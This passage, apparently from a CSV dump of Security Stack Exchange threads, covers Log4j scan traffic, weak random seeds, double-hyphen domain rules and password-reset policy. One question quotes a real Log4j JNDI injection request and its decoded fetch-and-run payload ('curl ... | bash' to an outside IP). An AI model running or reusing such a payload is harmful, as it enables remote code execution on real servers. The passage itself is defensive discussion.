","0","3","258391","<p>Status code really not matter for this instance. If the domains / IP's you have listed still available just get the bash files and take a quick look. Most of the exploitation happening regarding log4j is mostly crypto-miners.</p>
<ul>
<li>You can also listen to outbound - inbound traffic on hosted device to comfort yourself.</li>
<li>Other than that, <a href=""https://www.securitymetrics.com/blog/6-phases-incident-response-plan"" rel=""nofollow noreferrer"">you simply need to follow incident response steps similar to here.</a></li>
</ul>
","0"
"258308","258308","successfull log4j exploitation, or just normal traffic?","<p>First, thanks in advance and sorry if I'm asking some really silly thing, this is not my expertise :)</p>
<p>I have a webserver just for testing my things. Last week I checked if it was vulnerable to log4j CVE and it seemed only Jenkins was using some trace of log4j but inside slf4j (<a href=""https://www.slf4j.org/log4shell.html"" rel=""nofollow noreferrer"">https://www.slf4j.org/log4shell.html</a>) which doesn't seem to be vulnerable on that version.</p>
<pre><code>/var/lib/jenkins/plugins/ssh-slaves/WEB-INF/lib/log4j-over-slf4j-1.7.26.jar
</code></pre>
<p>I updated everything I could just to be on the safe side. I left it there but today I was messing with the apache logs and I started to see entries like this:</p>
<pre><code>195.54.160.149 - - [26/Dec/2021:10:43:35 +0100] &quot;GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/longbase64HERE} HTTP/1.1&quot; 200 90
</code></pre>
<p>Note: the edited base64 once decoded was something like:</p>
<pre><code>(curl -s 195.54.160.149:5874/MYIP:443||wget -q -O- 195.54.160.149:5874/MYIP:443)|bash
</code></pre>
<p>I ran several scripts to detect if there were more traces of log4j on my server, but everything seemed clear.</p>
<p>Should I be concerned that the server is responding with a 200 code?
Thanks</p>
","0","3","258406","<p>This is a normal log4j mass-scanning. This doesn't mean that it was successful (in this case they were trying to install a cryptominer).</p>
<p>Since you had already upgraded everything (and apparently, you weren't even vulnerable to begin with) that should be fine.</p>
<p>If you have access to firewall logs at that time, you could confirm there was no outgoing connection to 195.54.160.149.</p>
<p>It is of no concern that your webserver returned a 200. It was just replying with the contents of / (plus a parameter it doesn't use at all), so it's normal behavior. What would have been concerning would have been if for example your frontend logged that but a java-based backend had logged just <code>/?x=</code>, suggesting that it had interpreted the parameter.</p>
","1"
"258266","258266","Pseudorandom vs. True Random","<p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>
<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>
<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>
<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=""https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both"">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=""https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit"">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>
","15","5","258275","<p>With regard to:</p>
<blockquote>
<p>Also, an example of a truly random number would be if we use a seed
from let's say an audio file, and picked a pseudorandom place in the
file and then get the audio frequency at that location. Since only the
location was pseudorandom but the frequency at that location was not,
the value is truly random. Please correct me if this assumption is
flawed.</p>
</blockquote>
<p>It seems like this approach would produce 'random' values with very little entropy.  For example, if the audio file is sampled at 44.1 KHZ, and the audio is 5 minutes (300 seconds) long, this means that there are only 13,230,000 possible values (44100 * 300 = 13230000) in the space that this 'random' number generator produces.  An attacker who understands how your 'random' number generator works could easily iterate through all ~13 million values in short order, applying each one as the key in your encryption algorithm, until it finds the correct key that decrypts the ciphertext.  See <a href=""https://security.stackexchange.com/questions/226935/write-a-python-or-c-program-to-guess-the-key"">Write a Python or C program to guess the key</a> for an (albeit somewhat contrived) example of how this can be done.  Also, programs like <code>hashcat</code> and <code>john the ripper</code> can be used to automate this process.</p>
<p>With regard to your last paragraph: yes AES-256 (and even AES-128) are considered to be strong encryption algorithms - but their strength is contingent on a strong key.  If you generated a key by doing: <code>echo -n 'iloveyou123' | sha256sum</code>, then an attacker can find your key very quickly, again using a program like <code>hashcat</code> or <code>john the ripper</code>.</p>
<p>Java has a built-in function <a href=""https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html"" rel=""noreferrer"">SecureRandom()</a>.  On the page linked to above, it reads:</p>
<blockquote>
<p>This class provides a cryptographically strong random number generator
(RNG).</p>
</blockquote>
<p>You might want to consider using this function.</p>
","9"
"258266","258266","Pseudorandom vs. True Random","<p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>
<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>
<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>
<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=""https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both"">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=""https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit"">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>
","15","5","258277","<p>True random is always better. Unfortunately, it is <strong>much harder</strong>. The commonly used technique is that at boot time, the system tries to gather as much <em>random</em> values as it can: the date and time (not random at all but it allways changes, and it is to guess at what time (with millesecond precision) the random subsystem asked it, optionally, it can try to gather random values from the network, from the disk, or from the operator if the system can only be manually booted.</p>
<p>From that, it initializes its own system seed. Application that do nor require reproducible sequences can just rely on that system sequence.</p>
<p>Giving a seed is mainly of interest for tests. If you want to control the output of an algorithm using random values, using a specific seed allows to always receive the same sequence, and because of that to alway get the same output value which can then be easily controled. But for production code, you should <strong>never</strong> give yourself a seed.</p>
","2"
"258266","258266","Pseudorandom vs. True Random","<p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>
<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>
<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>
<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=""https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both"">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=""https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit"">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>
","15","5","258281","<p>There is a (common) misconception in this question that there is such a thing as “true” randomness and that this matters for security. In fact, whether “true” randomness exists is a philosophical question (physics gives a partial answer), which is not relevant for security.</p>
<p>There are many notions of randomness. What is relevant for security is <em><strong>unpredictability</strong></em>. Security is defined as protecting against adversaries. A value is “random”, for security purposes, if your adversary cannot find or guess it.</p>
<p>In the context of security, “true random” is sometimes used to mean a value is based on some physical process that no adversary can reproduce. For example, a coin flip is generally truly random in that sense. But not if the coin is too heavily biased, and not if the adversary can see the result of the coin flip. Performing 128 coin flips in front of a camera will not give you a secure 128-bit random number. (It does give you a value that cannot be predicted in advance, which is good for a few things but not good, for example, as a cryptographic key.)</p>
<p>Conversely, a value which is calculated in a deterministic way by a <a href=""https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator"" rel=""noreferrer"">cryptographically secure pseudorandom generator</a> (CSPRNG) is perfectly fine as a random value, as long as adversaries cannot learn the seed or the internal state of the random generator. The fact that only deterministic physical processes were involved other than the generation of the seed, and that the same seed was used to generate other random values, do not compromise the security of the random value (assuming that the CSPRNG was correctly designed and implemented — an assumption that holds for any secure processing).</p>
<p>“True” randomness is necessary for security because you have to seed the CSPRNG somehow. You can seed a CSPRNG with the output of a CSPRNG, but ultimately, you have to start somewhere with a non-deterministic or non-sufficiently-precisely-modeled physical process.</p>
<p>A random value is only good enough if it's <em>sufficiently</em> unpredictable. If I tell you that I picked my secret key at random between <code>12729af5a51075a68db9d4b05ce7981a</code> and <code>fc42099f25ee1eb5a8dc1178c35868b8</code>, that's not good for me: I did in fact generate those two values randomly, and you don't know which one it is, but you can still find it in at most two guesses. The measure of unpredictability or unknownability of a value is called <em><a href=""https://en.wikipedia.org/wiki/Entropy_(information_theory)"" rel=""noreferrer"">entropy</a></em> (beware that there are many related, but distinct concepts called <a href=""https://en.wikipedia.org/wiki/Entropy_(disambiguation)"" rel=""noreferrer"">entropy</a>). A fully known value has an entropy of 0. A value which has equal chances of being one of two known possibilities has an entropy of 1. By telling you that my key is one of these two values, I've reduced its entropy to at most 1 bit, no matter how randomly those two values were generated.</p>
<p>An audio file may or may not have a large amount of entropy. At one extreme, if the adversary has the same file, the entropy is 0. If the adversary has a different recording of the same sound, there may be artifacts due to the microphone quality and placement, but audio compression would tend to remove these artifacts. Microphone white noise can be a decent source of entropy, but you should get it directly from the hardware: by the time you get a recording, it's hard to make sure that the noise has been preserved and that the same noise hasn't been copied somewhere else.</p>
<p>The problem with <code>rand()</code> functions in the standard library of most programming languages is not that they're pseudorandom, but that they're not cryptographically secure for two major reasons:</p>
<ul>
<li>The adversary can find the seed. For example <code>srand(time())</code> is mostly predictable (depending on how precisely the adversary knows when your application ran – this has nothing to do with time-of-day being cyclical). And even if the adversary doesn't know the seed, if the seed is a 32-bit number, it's easy for the adversary to try all possible seeds by brute force. If it's a 64-bit number, it's costly but still doable.</li>
<li>Outputs are not independent: given enough outputs from <code>rand()</code>, it's possible to calculate other outputs.</li>
</ul>
<p>Secure random generators, such as <code>/dev/urandom</code> or <code>CryptGenRandom</code>, have neither of these flaws: they use a CSPRNG algorithm (which guarantees independent outputs) from a secure seed (which, in modern computers, can be generated from a component in the main CPU).</p>
","44"
"258266","258266","Pseudorandom vs. True Random","<p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>
<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>
<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>
<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=""https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both"">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=""https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit"">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>
","15","5","258282","<p>Your first assumption is incorrect, as usually system time is pulling from a real time clock which tends to output a unix timestamp which doesn't technically cycle. Pseudorandom number generators like those in popular programming languages (usually the mersenne twister) do cycle, however, due to their nature as deterministic functions. If the generator is initialized with the right parameters, the length of the 'period' or time before the &quot;pattern&quot; of the numbers generated starts repeating is great (2^19937 – 1).</p>
<p>Your second assumption is also not entirely correct as the 'random' number generated is still pseudorandom (debatably) as you are just &quot;whitening&quot; the algorithm by introducing more randomness. True randomness is generated by pulling data from physical phenomena such as radiation and atmospheric noise, and in the case of <code>/dev/random</code> hardware events.</p>
<p>Pseudorandom number generators are technically hackable given (in the case of the mersenne twister) 624 consecutive numbers generated from the seed [https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py], however that is not an easily exploitable vulnerability in the context of encryption</p>
","4"
"258266","258266","Pseudorandom vs. True Random","<p>Proper security algorithms demand <em>true</em> random numbers. For instance, secret keys &amp; initialization vectors should never not be true random.</p>
<p>However, generating numbers using Java's <code>Random</code> library or C's <code>srand()</code> initialization &amp; then <code>rand()</code> are only able to generate <em>pseudorandom</em> numbers. From what I understand, since functions like <code>srand()</code> gather the seed from some source such as system time, and the 24 hours time is cyclical, it is not truly random. Please correct me if this assumption is flawed.</p>
<p>Also, an example of a truly random number would be if we use a seed from let's say an audio file, and picked a <strong>pseudorandom</strong> place in the file and then get the audio frequency at that location. Since only the location was pseudorandom but the frequency at that location was not, the value is truly random. Please correct me if this assumption is flawed.</p>
<p>Finally, apologies for compounding the question further, exactly how vulnerable would it really leave systems if pseudorandom values are used? I have learned that AES 128 is actually enough to secure systems (<a href=""https://crypto.stackexchange.com/questions/77000/is-128-bit-security-still-considered-strong-in-2020-within-the-context-of-both"">Is 128-bit security still considered strong in 2020, within the context of both ECC Asym &amp; Sym ciphers?</a>). For military standards, 192 &amp; 256 were adopted  (<a href=""https://security.stackexchange.com/questions/14068/why-most-people-use-256-bit-encryption-instead-of-128-bit"">Why most people use 256 bit encryption instead of 128 bit?</a>). Is using true random values also akin to following such baseless standards, or is it actually crucial?</p>
","15","5","258289","<p>In matters of security <em>asking the right questions</em> is extremely important, as is asking clear and precise questions. Learning how to ask these questions is difficult so I will try to restate your questions in more precise terms as well as answer some questions that I think will help further your understanding.</p>
<ol>
<li>Does the fact that the time-of-day seed overflows create a security vulnerability?</li>
</ol>
<p>Basically no. I don't know of any modern system whose random seed overflows every 24 hours. Some old BASIC implementations did this. The main attack I can think of is to cause the program to run at the same time the next day, and you will get the same sequence of random numbers.</p>
<ol start=""2"">
<li>Does the fact that the time-of-day is <em>used</em> as a seed create a security vulnerability?</li>
</ol>
<p>Absolutely. If a program runs <code>srand(time(NULL))</code> and you know it started 2 hours ago, plus or minus 2 minutes, you know that it got seeded with one of 240 possible values, and you can easily brute force all 240 values, and if you can observe a couple of outputs you can quickly determine which of these seeds was the actual one and how far along in the sequence it has gone.</p>
<p>If this program happens to be one that is generating keys based on that seed alone, you can re-run the program with each of those 240 values and one of them will give the exact same keys.</p>
<ol start=""3"">
<li>So what if we give a &quot;true&quot; random seed to a pseudo-random generator?</li>
</ol>
<p>This is definitely better but is not necessarily good enough. Some PRNGs are &quot;stronger&quot; than others, but if you observe enough outputs of the PRNG you can eventually deduce the internal entropy value and begin predicting future values. PRNGs are usually designed to be efficient to execute, rather than be cryptographically secure. However <a href=""https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator"" rel=""nofollow noreferrer"">there are exceptions</a>.</p>
<ol start=""4"">
<li>If we select a pseudorandom location in an audio file, does that give us &quot;true&quot; randomness?</li>
</ol>
<p>No. The audio file can be considered part of your seed. If you run the same program with the same PRNG seed and the same audio file you will get the same sequence of numbers. Alternatively you can consider the audio file as a &quot;secret&quot; part of your algorithm, which is then <a href=""https://en.wikipedia.org/wiki/Security_through_obscurity"" rel=""nofollow noreferrer"">security through obscurity</a>.</p>
<p>There's more. An audio file is not random at all (unless it's white noise!) If you exploit some other weakness in the system to guess the outputs of the PRNG, then you can start to build a picture of what is in this audio file, which will let you make guesses when you get a sample that is quite close to a previous sample, but also, you might be able to guess what is in the audio file. For example if you reconstruct enough to guess that it is a recording of a human voice this will make it easier to guess some of the statistical properties within the file.</p>
<p>Even if you don't know what the PRNG is doing, you will still be able to observe a non-uniform distribution in the values of the frequencies in the audio.</p>
<ol start=""5"">
<li>OK, forget the audio file. Let's just say we have a giant table of 10 million truly random numbers that we got somewhere. And we use a PRNG to index into it. Is that random?</li>
</ol>
<p>What advantage does that have over just using the numbers in the table in the original order? Are you hoping to be able to re-use the table for a longer period of time? The longer you use it for, the more likely some weakness in the PRNG will be exploited to your detriment. Better to have each entry in the table have a fixed lifespan: <a href=""https://en.wikipedia.org/wiki/One-time_pad"" rel=""nofollow noreferrer"">single use only</a>. In this case adding a PRNG does not make it any more random. Rather than storing big tables which might be leaked, you might as well get the numbers from a hardware generator exactly when you need them, then discard them.</p>
<ol start=""6"">
<li><em>exactly how vulnerable would it really leave systems if pseudorandom values are used?</em></li>
</ol>
<p>This depends hugely on the precise combination of application, seed source, PRNG algorithm, and threat model. If the seed source is <code>time(NULL)</code>, and the attacker has access to the binary, it's like leaving your keys in the front door. If you at least pull the seed out of <code>/dev/random</code> you might be making an attack infeasible, or it might just need the attacker to observe your program for a few weeks to get enough info to make some deductions.</p>
<p>If the attacker doesn't have your binary but correctly guesses you are using <code>srand(time(NULL))</code> then they can potentially collect enough observations to make their move.</p>
<p>An attacker could potentially launch a DDoS attack or something to crash your server or cause more instances to spin up, thus guaranteeing that they get their PRNG seed from a reasonably predictable timestamp.</p>
<p>If, however, you use a PRNG that doesn't make it easy to infer the hidden state, seed it with <a href=""https://en.wikipedia.org/wiki/Hardware_random_number_generator"" rel=""nofollow noreferrer"">hardware entropy</a> rather than a timestamp, and use the numbers in a way that doesn't leak a lot of information, it will not be easy to attack.</p>
<p>As with all things security though, just one mistake can completely compromise you, which is why it is advisable not to rely on all those assumptions about your seed, PRNG and application when you can instead simply use a sequence of one-time random values derived from hardware entropy.</p>
","1"
"258194","258194","Why are SSL CAs prohibiting double dash in third and fourth characters?","<p><a href=""https://docs.digicert.com/manage-certificates/public-certificates-data-entries-that/"" rel=""noreferrer"">Digicert has disallowed</a> &quot;double dashes&quot; in the third and fourth characters in new certs:</p>
<blockquote>
<p>Effective October 1, 2021, for publicly trusted TLS/SSL certificates, we no longer allow the use of double dashes (--) in the third and fourth characters in domain names, unless the double dashes proceed the letters xn (xn--example.com).</p>
</blockquote>
<p>Similarly, AWS has made such certs <a href=""https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html"" rel=""noreferrer"">ineligible for ACM renewal</a>.</p>
<p>Digicert references ballot 202, which I <a href=""https://cabforum.org/2017/07/26/ballot-202-underscore-wildcard-characters/"" rel=""noreferrer"">found on cabforum</a>.</p>
<blockquote>
<p>CAs MUST NOT include Domain Labels which have hyphens as the third
and fourth characters unless the first character is “x” or “X”, the second
character is “n” or “N”, and the fifth and later characters are a valid
Punycode string.</p>
</blockquote>
<p>This is my first time encountering punycode, and it seems rather interesting itself.  But why are CAs prohibited from using hyphens when the domain is NOT punycode?  Is there some security concern at play here?  Digicert mentions that sites like <code>es--xyz.loudsquid.com</code> are not allowed.  Why is <code>es--</code> undesirable?</p>
","23","4","258197","<p>This is due to the double dash's usage in internationalized domain names. <code>xn--</code> has a special meaning in domain names, and it is technically a violation of the IDNA2008 standard if the <code>--</code> series of characters is in the 3rd and 4th spot, unless the first 2 characters are <code>xn</code>.</p>
<p>The specific RFCs that were defined for IDNA2008 are RFC 5890 to 5894.</p>
","3"
"258194","258194","Why are SSL CAs prohibiting double dash in third and fourth characters?","<p><a href=""https://docs.digicert.com/manage-certificates/public-certificates-data-entries-that/"" rel=""noreferrer"">Digicert has disallowed</a> &quot;double dashes&quot; in the third and fourth characters in new certs:</p>
<blockquote>
<p>Effective October 1, 2021, for publicly trusted TLS/SSL certificates, we no longer allow the use of double dashes (--) in the third and fourth characters in domain names, unless the double dashes proceed the letters xn (xn--example.com).</p>
</blockquote>
<p>Similarly, AWS has made such certs <a href=""https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html"" rel=""noreferrer"">ineligible for ACM renewal</a>.</p>
<p>Digicert references ballot 202, which I <a href=""https://cabforum.org/2017/07/26/ballot-202-underscore-wildcard-characters/"" rel=""noreferrer"">found on cabforum</a>.</p>
<blockquote>
<p>CAs MUST NOT include Domain Labels which have hyphens as the third
and fourth characters unless the first character is “x” or “X”, the second
character is “n” or “N”, and the fifth and later characters are a valid
Punycode string.</p>
</blockquote>
<p>This is my first time encountering punycode, and it seems rather interesting itself.  But why are CAs prohibited from using hyphens when the domain is NOT punycode?  Is there some security concern at play here?  Digicert mentions that sites like <code>es--xyz.loudsquid.com</code> are not allowed.  Why is <code>es--</code> undesirable?</p>
","23","4","258210","<p>The double hyphen is reserved as a generalized extensibility mechanism of which Punycode is one example.</p>
<p>RFC 5891: 4.2.3.1. Hyphen Restrictions</p>
<p>The Unicode string MUST NOT contain &quot;--&quot; (two consecutive hyphens) in the third and fourth character positions and MUST NOT start or end with a &quot;-&quot; (hyphen).</p>
","18"
"258194","258194","Why are SSL CAs prohibiting double dash in third and fourth characters?","<p><a href=""https://docs.digicert.com/manage-certificates/public-certificates-data-entries-that/"" rel=""noreferrer"">Digicert has disallowed</a> &quot;double dashes&quot; in the third and fourth characters in new certs:</p>
<blockquote>
<p>Effective October 1, 2021, for publicly trusted TLS/SSL certificates, we no longer allow the use of double dashes (--) in the third and fourth characters in domain names, unless the double dashes proceed the letters xn (xn--example.com).</p>
</blockquote>
<p>Similarly, AWS has made such certs <a href=""https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html"" rel=""noreferrer"">ineligible for ACM renewal</a>.</p>
<p>Digicert references ballot 202, which I <a href=""https://cabforum.org/2017/07/26/ballot-202-underscore-wildcard-characters/"" rel=""noreferrer"">found on cabforum</a>.</p>
<blockquote>
<p>CAs MUST NOT include Domain Labels which have hyphens as the third
and fourth characters unless the first character is “x” or “X”, the second
character is “n” or “N”, and the fifth and later characters are a valid
Punycode string.</p>
</blockquote>
<p>This is my first time encountering punycode, and it seems rather interesting itself.  But why are CAs prohibited from using hyphens when the domain is NOT punycode?  Is there some security concern at play here?  Digicert mentions that sites like <code>es--xyz.loudsquid.com</code> are not allowed.  Why is <code>es--</code> undesirable?</p>
","23","4","258230","<p>The purpose of leaving certain patterns of alphanumeric-and-dash strings reserved is to allow for the possibility that they might be used to represent something that can't presently be represented.  There's no way a certificate authority can know what a string like <code>aa--bcde</code> might mean in future, and who might be entitled to use such a thing as a domain name.  If a CA were to issue certificates for that domain name to Acme Enterprises and then the committee in charge of domain name formats decided that names starting with <code>aa--</code> should be issued by the Accreditation Agency, which issued Binary Coded Decimal Enterprises the name <code>aa-bcde</code>, the fact that Acme Enterprise had a certificate for that name would be a problem.  To be sure, it might be mitigated by issuing a revocation for the issued certs, but it's better to simply avoid such problems in the first place.</p>
","3"
"258194","258194","Why are SSL CAs prohibiting double dash in third and fourth characters?","<p><a href=""https://docs.digicert.com/manage-certificates/public-certificates-data-entries-that/"" rel=""noreferrer"">Digicert has disallowed</a> &quot;double dashes&quot; in the third and fourth characters in new certs:</p>
<blockquote>
<p>Effective October 1, 2021, for publicly trusted TLS/SSL certificates, we no longer allow the use of double dashes (--) in the third and fourth characters in domain names, unless the double dashes proceed the letters xn (xn--example.com).</p>
</blockquote>
<p>Similarly, AWS has made such certs <a href=""https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html"" rel=""noreferrer"">ineligible for ACM renewal</a>.</p>
<p>Digicert references ballot 202, which I <a href=""https://cabforum.org/2017/07/26/ballot-202-underscore-wildcard-characters/"" rel=""noreferrer"">found on cabforum</a>.</p>
<blockquote>
<p>CAs MUST NOT include Domain Labels which have hyphens as the third
and fourth characters unless the first character is “x” or “X”, the second
character is “n” or “N”, and the fifth and later characters are a valid
Punycode string.</p>
</blockquote>
<p>This is my first time encountering punycode, and it seems rather interesting itself.  But why are CAs prohibited from using hyphens when the domain is NOT punycode?  Is there some security concern at play here?  Digicert mentions that sites like <code>es--xyz.loudsquid.com</code> are not allowed.  Why is <code>es--</code> undesirable?</p>
","23","4","258231","<p>Adding an answer because too long in a comment, but on the specific point of why reserving everything if <code>xn--</code> is enough.</p>
<p>In one of first iteration of IDNA standard (<a href=""https://en.wikipedia.org/wiki/Internationalized_domain_name"" rel=""nofollow noreferrer"">&quot;Internationalizing Domain Names in Applications&quot;</a>), in a draft in November 2001 (draft-ietf-idn-idna-04) there was this:</p>
<blockquote>
<ol start=""5"">
<li>ACE prefix
The ACE prefix, used in the conversion operations (section 4), will
be specified in a future revision of this document. It will be two
alphanumeric ASCII characters followed by two hyphen-minuses. It MUST
be recognized in a case-insensitive manner.</li>
</ol>
</blockquote>
<p>The scheme allowed interoperability tests when there was multiple encodings proposed. So in fact it seems there was at least <code>bl--</code>, <code>bq--</code>, <code>dq--</code>, <code>lq--</code>, <code>mq--</code>, <code>ra--</code>, <code>wq--</code> and <code>zq--</code> (and when things solidified, <code>xn</code> was chosen at random so that no one had a head start and no collisions with actual existing names -- see <a href=""https://web.archive.org/web/20100427154004/http://www.atm.tut.fi/list-archive/ietf-announce/msg13572.html"" rel=""nofollow noreferrer"">https://web.archive.org/web/20100427154004/http://www.atm.tut.fi/list-archive/ietf-announce/msg13572.html</a> to see exactly how <code>xn</code> was chosen by the IETF). If you are old enough, you would remember that Network Solutions/Verisign then was selling <code>bq--</code> domain names, as IDN testbed.</p>
<p>In February 2003:</p>
<blockquote>
<p>An eligible subset of that list of 42 entries will be determined
by eliminating the following codes due to their use, in one or more
top-level domain zone files that have been reviewed, as the first two
characters of second-level domain labels that have hyphens in their
third and fourth character positions:
AA, QM to QZ, XA, XZ, and ZZ.</p>
</blockquote>
<p>Going back to December 2000 at IETF San Diego has these notes:</p>
<blockquote>
<p>ACE identifier candidates</p>
<ul>
<li>prefixes: AA--, AB--, ..., 99--</li>
<li>suffixes: --AA, --AB, ..., --99</li>
</ul>
<p>Relevant domain names: aa--a.com, aa-b.org, ..99--zzzz.net, aa--x.co.jp, etc.
a-aa.com, b--aa.org, ..., zzzzz--99.or.kr, etc.</p>
<p>Proposal</p>
<p>step 1: tentative suspension of registering relevant domain names for ACE identifier candidates</p>
<p>step 2: conduct a survey of relevant domain names already registered</p>
<p>step 3: select about 10 to 20 identifiers one of which is for test and
others for real use, based on the survey</p>
<p>step 4: permanent blocking of
registrations of domain names relevant to the selected identifiers
(except for registrations compliant to MDN semantics).</p>
</blockquote>
<p>In November 2000 in <code>draft-ietf-idn-aceid-00</code> we have:</p>
<blockquote>
<p>All strings starting with a combination of two alpha-numericals,
followed by two hyphens, are defined to be ACE prefix identifier
candidates.  All strings starting with one hyphen followed by three
alpha-numericals, and strings starting with two hyphens followed by
two alpha-numericals are defined as ACE suffix identifier candidates.
ACE prefix identifier candidates and ACE suffix identifier candidates
are collectively called ACE identifier candidates.</p>
</blockquote>
<p>which got simplified in following June to just:</p>
<blockquote>
<p>All strings starting with a combination of two alpha-numericals,
followed by two hyphens, are defined to be ACE prefix identifier
candidates.  All strings starting with two hyphens followed by two
alpha-numericals are defined as ACE suffix identifier candidates.</p>
</blockquote>
<p>And the mailing list archives before 2001-01 seems to be lost forever so no way to find more about that, I fear.</p>
<h1>June 2023 update</h1>
<p>I stumbled upon a document enforcing the prohibition.
At <a href=""https://www.icann.org/en/system/files/files/idn-guidelines-22sep22-en.pdf"" rel=""nofollow noreferrer"">https://www.icann.org/en/system/files/files/idn-guidelines-22sep22-en.pdf</a> you can find &quot;Guidelines for the Implementation of Internationalized
Domain Names - Version 4.1 -
22 September 2022&quot; which says this in §2.1:</p>
<blockquote>
<ol start=""4"">
<li>No label containing hyphens in both the third and the fourth positions may be registered
unless it is a valid A-label, with reservation for transitional action. Labels with hyphens in
both the third and the fourth positions are explicitly reserved to indicate encoding schemes,
of which IDNA is only one instantiation. These guidelines are not intended to assist with any
other instantiations.</li>
</ol>
</blockquote>
<p>I don't think it is like an actual policy from ICANN, but surely something at least all gTLD registries have to follow. There is only this mention on ICANN's website:</p>
<blockquote>
<p>Registries seeking to deploy IDNs under their agreements with ICANN have been authorized to do so on the basis of the Guidelines.</p>
</blockquote>
<p>(from <a href=""https://www.icann.org/resources/pages/implementation-guidelines-2012-02-25-en"" rel=""nofollow noreferrer"">https://www.icann.org/resources/pages/implementation-guidelines-2012-02-25-en</a>)</p>
","22"
"258159","258159","Send password reset email after too many failed logins versus X minutes of lock out","<p>Some sites lock me out for a while after too many failed attempts.</p>
<p>For our own site, we want to force a password reset email after X amount of failed attempts. After all, if your email is compromised, then everything is compromised.</p>
<p>Further advantages: we don't stop the user in their tracks.</p>
<p>Am I missing something?</p>
","0","3","258161","<p>You assume that they would have access to their email. That ties access to your site to their access to their email. Loss of access to email can be more than a compromised email account. You could, in fact, be stopping the user in their tracks by assuming that they would have email access.</p>
<p>This might be fine, depending on the criticality of your site, but you have to make this choice mindfully and consider the impact.</p>
<p>Other options are</p>
<ul>
<li>an increasing timeout (1/5/10/30/n minute timeouts) to enable more attempts</li>
